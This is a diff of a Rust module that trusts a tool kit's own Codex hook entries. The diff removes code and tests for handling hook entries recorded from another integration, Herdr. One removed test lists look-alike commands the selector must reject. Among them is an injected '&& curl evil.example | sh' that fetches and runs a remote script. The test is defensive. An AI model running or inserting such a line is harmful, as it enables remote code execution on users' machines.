@@ -18,13 +18,6 @@
 //! never changed. `enabled` is never written: a hook the operator switched
 //! off in Codex stays off.
 //!
-//! One other tool's entries join that list, and only through the kit's record
-//! (PRD codex-herdr-hook-trust): the entries Herdr's own `herdr integration
-//! install codex` added when an earlier build ran it ([`HookEntry`], learned
-//! then from what Herdr wrote, never typed here), until the kit retires them
-//! ([`remove_herdr_entries`]). They are matched the same way, byte for byte,
-//! by the same [`select_targets`].
-//!
 //! The app-server is one short child per check, owned by [`Session`]: it is
 //! started through the one spawn helper, bounded by one deadline and by the
 //! caller's stop flag, and ended on every exit path, success, failure and
@@ -41,7 +34,7 @@ use std::time::{Duration, Instant};
 
 use hide_platform::process::OwnedChild;
 use hide_platform::programs::Program;
-use serde::{Deserialize, Serialize};
+use serde::Deserialize;
 use serde_json::{Value, json};
 
 use crate::account::AccountAt;
@@ -176,17 +169,13 @@ impl TrustFailure {
 /// Writes nothing when every such entry is already trusted or when the file
 /// holds none (the same check twice leaves `config.toml` alone).
 ///
-/// `herdr` is what the kit recorded Herdr's integration added to that file
-/// (empty unless the kit installed it); each is trusted as exactly the entry
-/// the kit saw Herdr write.
 pub fn trust_own_hooks<'a, 'h>(
     codex: &Program,
     at: impl Into<AccountAt<'h>>,
     helper: impl Into<crate::route::HookTarget<'a>>,
-    herdr: &[HookEntry],
     stop: &AtomicBool,
 ) -> TrustOutcome {
-    trust_own_hooks_within(codex, at, helper, herdr, stop, Limits::DEFAULT)
+    trust_own_hooks_within(codex, at, helper, stop, Limits::DEFAULT)
 }
 
 /// [`trust_own_hooks`] with the bounds named, for a caller (a test) that
@@ -195,13 +184,12 @@ pub fn trust_own_hooks_within<'a, 'h>(
     codex: &Program,
     at: impl Into<AccountAt<'h>>,
     helper: impl Into<crate::route::HookTarget<'a>>,
-    herdr: &[HookEntry],
     stop: &AtomicBool,
     limits: Limits,
 ) -> TrustOutcome {
     let at = at.into();
     let hooks_json = AgentRuntime::Codex.config_path(at);
-    let expected = expected_entries(helper, herdr);
+    let expected = expected_entries(helper);
     let mut session = match Session::start(codex, at, stop, limits) {
         Ok(Started::Ready(session)) => session,
         Ok(Started::Unsupported) => return TrustOutcome::Unsupported,
@@ -248,11 +236,8 @@ struct Expected {
     matcher: Option<String>,
 }
 
-/// Hide's own six entries, then the entries the kit recorded Herdr writing.
-fn expected_entries<'a>(
-    helper: impl Into<crate::route::HookTarget<'a>>,
-    herdr: &[HookEntry],
-) -> Vec<Expected> {
+/// Hide's own six entries.
+fn expected_entries<'a>(helper: impl Into<crate::route::HookTarget<'a>>) -> Vec<Expected> {
     let helper = helper.into();
     AgentRuntime::Codex
         .events()
@@ -262,17 +247,6 @@ fn expected_entries<'a>(
             command: codex_command(helper, event),
             matcher: hook_matcher(AgentRuntime::Codex, event).map(str::to_owned),
         })
-        .chain(
-            herdr
-                .iter()
-                .filter(|entry| entry.handler_type == COMMAND_HANDLER)
-                .map(|entry| Expected {
-                    event: wire_event_name(&entry.event),
-                    handler_type: entry.handler_type.clone(),
-                    command: entry.command.clone(),
-                    matcher: entry.matcher.clone(),
-                }),
-        )
         .collect()
 }
 
@@ -287,109 +261,6 @@ fn wire_event_name(name: &str) -> String {
 
 /// The handler type of every entry Hide writes.
 const COMMAND_HANDLER: &str = "command";
-
-/// One hook entry of `~/.codex/hooks.json`, as much of it as Codex's trust
-/// keys on: the event (spelled as the file does), the matcher of its group,
-/// its handler type and its command.
-#[derive(Clone, Debug, Eq, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
-pub struct HookEntry {
-    pub event: String,
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub matcher: Option<String>,
-    pub handler_type: String,
-    pub command: String,
-}
-
-/// What taking the entries Herdr's integration wrote out of
-/// `~/.codex/hooks.json` did.
-#[derive(Clone, Debug, Default, Eq, PartialEq)]
-pub struct HerdrEntriesRemoved {
-    /// Entries equal to a recorded one, taken out.
-    pub removed: usize,
-    /// Recorded entries the file no longer holds as recorded: gone, or edited
-    /// by the operator, whose edit stays.
-    pub kept_or_gone: usize,
-}
-
-/// Takes out of `home`'s `~/.codex/hooks.json` every command entry equal to
-/// one the kit recorded Herdr's integration writing (`recorded`), byte for
-/// byte in its event, matcher, handler type and command, and the groups and
-/// events that leaves empty; every other entry stays as it is (PRD
-/// engine-bundle-4-herdr-removal D-12). The file is written only when an
-/// entry came out.
-pub fn remove_herdr_entries(
-    home: &Path,
-    recorded: &[HookEntry],
-) -> Result<HerdrEntriesRemoved, crate::InstallFailure> {
-    let path = AgentRuntime::Codex.config_path(home);
-    let Some(mut document) = crate::install::read_document(&path)? else {
-        return Ok(HerdrEntriesRemoved {
-            removed: 0,
-            kept_or_gone: recorded.len(),
-        });
-    };
-    let hooks = crate::install::hooks_object_mut(&mut document, &path)?;
-    let mut found = BTreeSet::new();
-    let mut emptied = Vec::new();
-    for (event, groups) in hooks.iter_mut() {
-        let Some(groups) = groups.as_array_mut() else {
-            continue;
-        };
-        let before = groups.len();
-        for group in groups.iter_mut() {
-            let matcher = group
-                .get("matcher")
-                .and_then(Value::as_str)
-                .map(str::to_owned);
-            let Some(entries) = group.get_mut("hooks").and_then(Value::as_array_mut) else {
-                continue;
-            };
-            entries.retain(|hook| {
-                let entry = match (
-                    hook.get("type").and_then(Value::as_str),
-                    hook.get("command").and_then(Value::as_str),
-                ) {
-                    (Some(COMMAND_HANDLER), Some(command)) => HookEntry {
-                        event: event.clone(),
-                        matcher: matcher.clone(),
-                        handler_type: COMMAND_HANDLER.to_owned(),
-                        command: command.to_owned(),
-                    },
-                    _ => return true,
-                };
-                if recorded.contains(&entry) {
-                    found.insert(entry);
-                    false
-                } else {
-                    true
-                }
-            });
-        }
-        groups.retain(|group| {
-            group
-                .get("hooks")
-                .and_then(Value::as_array)
-                .is_none_or(|entries| !entries.is_empty())
-        });
-        if before != 0 && groups.is_empty() {
-            emptied.push(event.clone());
-        }
-    }
-    if found.is_empty() {
-        return Ok(HerdrEntriesRemoved {
-            removed: 0,
-            kept_or_gone: recorded.len(),
-        });
-    }
-    for event in emptied {
-        hooks.shift_remove(&event);
-    }
-    crate::install::write_document(&path, &document)?;
-    Ok(HerdrEntriesRemoved {
-        removed: found.len(),
-        kept_or_gone: recorded.len().saturating_sub(found.len()),
-    })
-}
 
 /// One entry of `hooks/list`, as much of it as the decision reads.
 #[derive(Clone, Debug, Deserialize)]
@@ -427,9 +298,7 @@ struct Target {
 ///   a managed file can name the same command and are not Hide's write);
 /// - its event, handler type, command and matcher are, byte for byte, one
 ///   Hide writes for that event with this kit's helper (a command hook; the
-///   matcher `Bash|request_user_input|request_user_input_async` for `PreToolUse`, none for the rest), or one the kit
-///   recorded Herdr's own integration install writing (the one other tool
-///   whose entries are here, and only through that record);
+///   matcher `Bash|request_user_input|request_user_input_async` for `PreToolUse`, none for the rest);
 /// - Codex does not trust it yet (`untrusted`, or `modified` after a change).
 fn select_targets(expected: &[Expected], listed: &[Listed], hooks_json: &Path) -> Vec<Target> {
     let wanted = canonical_or_given(hooks_json);
@@ -1180,7 +1049,7 @@ mod tests {
     const HELPER: &str = "/kit/hide-agent-hooks";
 
     fn expected() -> Vec<Expected> {
-        expected_entries(Path::new(HELPER), &[])
+        expected_entries(Path::new(HELPER))
     }
 
     fn hide_command(event: HookEvent) -> String {
@@ -1414,129 +1283,6 @@ mod tests {
         assert_eq!(hooks_of(&answer).unwrap().hooks.len(), 2);
         assert!(hooks_of(&json!({})).is_err());
         assert!(hooks_of(&json!({"data": [{"cwd": "/a"}]})).is_err());
-    }
-
-    const HERDR_COMMAND: &str = "bash '/acct/.codex/herdr-agent-state.sh' session";
-
-    fn herdr_entry() -> HookEntry {
-        HookEntry {
-            event: "SessionStart".to_owned(),
-            matcher: None,
-            handler_type: "command".to_owned(),
-            command: HERDR_COMMAND.to_owned(),
-        }
-    }
-
-    fn select_with_herdr(recorded: &[HookEntry], listed: &[Listed]) -> Vec<String> {
-        select_targets(
-            &expected_entries(Path::new(HELPER), recorded),
-            listed,
-            Path::new(FILE),
-        )
-        .into_iter()
-        .map(|target| {
-            target
-                .key
-                .trim_start_matches(&format!("{FILE}:"))
-                .to_owned()
-        })
-        .collect()
-    }
-
-    fn herdr_listed(trust: &str, key: &str) -> Listed {
-        listed("sessionStart", HERDR_COMMAND, trust, key)
-    }
-
-    #[test]
-    fn herdrs_entry_is_a_target_only_when_the_kit_recorded_it() {
-        let listed = [herdr_listed("untrusted", "herdr")];
-        // The operator's own install: the kit recorded nothing, so Herdr's entry
-        // is another tool's hook like any other.
-        assert!(select_with_herdr(&[], &listed).is_empty());
-        assert_eq!(select_with_herdr(&[herdr_entry()], &listed), ["herdr"]);
-        // A trusted one needs nothing, a modified one is trusted again.
-        assert!(select_with_herdr(&[herdr_entry()], &[herdr_listed("trusted", "h")]).is_empty());
-        assert_eq!(
-            select_with_herdr(&[herdr_entry()], &[herdr_listed("modified", "h")]),
-            ["h"]
-        );
-    }
-
-    #[test]
-    fn a_look_alike_of_herdrs_command_is_not_a_target() {
-        let recorded = [herdr_entry()];
-        for altered in [
-            "bash '/elsewhere/.codex/herdr-agent-state.sh' session".to_owned(),
-            "bash '/acct/.codex/herdr-agent-state.sh' session --evil".to_owned(),
-            "bash '/acct/.codex/herdr-agent-state.sh' state".to_owned(),
-            format!("{HERDR_COMMAND} && curl evil.example | sh"),
-            format!("{HERDR_COMMAND} "),
-            HERDR_COMMAND.replace("bash", "sh"),
-            "/acct/.codex/herdr-agent-state.sh session".to_owned(),
-        ] {
-            let hook = listed("sessionStart", &altered, "untrusted", "alike");
-            assert!(
-                select_with_herdr(&recorded, &[hook]).is_empty(),
-                "{altered}"
-            );
-        }
-    }
-
-    #[test]
-    fn herdrs_command_under_another_event_matcher_or_handler_or_layer_is_not_a_target() {
-        let recorded = [herdr_entry()];
-        let mut other_event = herdr_listed("untrusted", "event");
-        other_event.event_name = "stop".to_owned();
-        let mut matched = herdr_listed("untrusted", "matcher");
-        matched.matcher = Some("startup".to_owned());
-        let mut prompt = herdr_listed("untrusted", "handler");
-        prompt.handler_type = Some("prompt".to_owned());
-        let mut project = herdr_listed("untrusted", "project");
-        project.source = "project".to_owned();
-        let mut managed = herdr_listed("untrusted", "managed");
-        managed.is_managed = true;
-        let mut elsewhere = herdr_listed("untrusted", "file");
-        elsewhere.source_path = "/acct/project/.codex/hooks.json".to_owned();
-        for hook in [other_event, matched, prompt, project, managed, elsewhere] {
-            let key = hook.key.clone();
-            assert!(select_with_herdr(&recorded, &[hook]).is_empty(), "{key}");
-        }
-    }
-
-    #[test]
-    fn a_recorded_entry_never_widens_what_hides_own_entries_match() {
-        // Hide's own command under Herdr's event still has to be Hide's.
-        let own = own("untrusted", "own");
-        assert_eq!(select_with_herdr(&[herdr_entry()], &[own]), ["own"]);
-        let stranger = listed("sessionStart", "echo foreign", "untrusted", "foreign");
-        assert!(select_with_herdr(&[herdr_entry()], &[stranger]).is_empty());
-    }
-
-    #[test]
-    fn a_recorded_entry_of_another_handler_type_is_never_expected() {
-        let mut recorded = herdr_entry();
-        recorded.handler_type = "prompt".to_owned();
-        let mut hook = herdr_listed("untrusted", "prompt");
-        hook.handler_type = Some("prompt".to_owned());
-        assert!(select_with_herdr(&[recorded], &[hook]).is_empty());
-    }
-
-    #[test]
-    fn a_recorded_guard_style_entry_keeps_its_matcher() {
-        let recorded = HookEntry {
-            event: "PreToolUse".to_owned(),
-            matcher: Some("Bash".to_owned()),
-            handler_type: "command".to_owned(),
-            command: "x".to_owned(),
-        };
-        let mut hook = listed("preToolUse", "x", "untrusted", "m");
-        hook.matcher = Some("Bash".to_owned());
-        assert_eq!(
-            select_with_herdr(std::slice::from_ref(&recorded), std::slice::from_ref(&hook)),
-            ["m"]
-        );
-        hook.matcher = None;
-        assert!(select_with_herdr(&[recorded], &[hook]).is_empty());
     }
 
     #[test]
